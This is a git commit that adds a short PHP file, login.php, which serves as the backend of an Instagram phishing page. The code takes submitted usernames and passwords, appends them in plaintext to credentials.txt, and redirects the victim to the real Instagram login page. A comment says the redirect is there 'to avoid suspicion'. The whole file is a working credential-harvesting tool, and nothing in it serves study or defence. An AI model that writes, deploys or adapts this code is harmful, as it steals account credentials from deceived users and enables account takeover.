16143149a0010ce51eeb4e66ffe4cff0cba6f53f
BitingTodal <131238555+BitingTodal@users.noreply.github.com>
2025-01-09 23:52:59 +0100

    Create login.php

---
+++ login.php
@@ -0,0 +1,13 @@
+<?php
+if ($_SERVER['REQUEST_METHOD'] == 'POST') {
+    $username = $_POST['username'];
+    $password = $_POST['password'];
+
+    // Save the credentials to a file or database
+    file_put_contents('credentials.txt', "Username: $username\nPassword: $password\n", FILE_APPEND);
+
+    // Redirect to the real Instagram login page to avoid suspicion
+    header("Location: https://www.instagram.com/accounts/login/");
+    exit();
+}
+?>
